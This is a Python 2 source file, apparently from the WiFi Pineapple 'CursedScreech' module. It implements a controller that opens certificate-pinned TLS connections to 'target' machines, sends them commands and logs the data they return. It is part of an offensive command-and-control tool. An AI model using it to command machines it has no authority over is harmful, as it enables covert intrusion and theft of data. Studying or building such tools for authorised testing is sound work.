from ssl import *
from socket import *
import time

# Pull settings from file
settingsFile = "/pineapple/modules/CursedScreech/includes/forest/settings"
targetLogLocation = "/pineapple/modules/CursedScreech/includes/forest/targetlogs/"
activity_log = priv_key = pub_cer = client_key = client_serial = ""
settings = {}
with open(settingsFile, "r") as sFile:
	for line in sFile:
		params = line.strip("\n").split("=")
		if params[0] == "activity_log":
			activity_log = params[1]
		elif params[0] == "kuro_key":
			priv_key = params[1] + ".pem"
			pub_cer = params[1] + ".cer"
		elif params[0] == "target_key":
			client_key = params[1] + ".cer"
		elif params[0] == "client_serial":
			client_serial = params[1]
		else:
			pass

def logActivity(msg):
	with open(activity_log, "a") as log:
		log.write(msg + "\n")
		
def logReceivedData(data, file):
	with open(targetLogLocation + file, "a+") as tLog:
		tLog.write(data + "\n")

class Target:
	def __init__(self,addr=None,port=None):
		self.addr = addr
		self.port = int(port)
		self.socket = None
		self.msg = ""
		self.recvData = ""
		self.connected = False
		self.lastSeen = time.time()

	def secureConnect(self):
		print "[>] Connecting to " + self.sockName()
		logActivity("[>] Connecting to " + self.sockName())

		try:
			sck = socket(AF_INET, SOCK_STREAM)
			self.socket = wrap_socket(sck, ssl_version=PROTOCOL_SSLv23, keyfile=priv_key, certfile=pub_cer, cert_reqs=CERT_REQUIRED, ca_certs=client_key)
			self.socket.connect((self.addr,self.port))
		
			# Fetch the target's certificate to verify their identity
			cert = self.socket.getpeercert()
			if not cert['serialNumber'] == client_serial:
				logActivity("[-] Certificate serial number doesn't match.")
				self.disconnect()
			else:
				print "[+] Connected to " + self.sockName() + " via " + self.socket.version()
				logActivity("[+] Connected to " + self.sockName() + " via " + self.socket.version())
				self.connected = True
				
		except error as sockerror:
			logActivity("[!] Failed to connect to " + self.sockName())
			self.connected = False

	def send(self, data):
		self.socket.sendall(data.encode())
		logActivity("[!] Command sent to " + self.sockName())
		
	def recv(self):
		if self.isConnected():
			try:
				d = self.socket.recv(4096)
				self.recvData = d.decode()
			
				if not self.recvData:
					print "[!] Target " + self.sockName() + " disconnected. Connection closed."
					logActivity("[!] Target " + self.sockName() + " disconnected. Connection closed.")
					self.connected = False
					return
			
				logReceivedData(self.recvData + "\n", self.addr)
				logActivity("[+] Data received from: " + self.sockName())
		
			except KeyboardInterrupt:
				return
			
	def isConnected(self):
		return self.connected
	
	def sockName(self):
		return self.addr + ":" + str(self.port)
	
	def disconnect(self):
		logActivity("[!] Closing connection to " + self.sockName())
		self.socket.shutdown(SHUT_RDWR)
		self.socket.close()
		self.connected = False
		
	def setPort(self, port):
		self.port = int(port)
		
	def isMissing(self, limit):
		if time.time() - self.lastSeen > limit:
			return True
		else:
			return False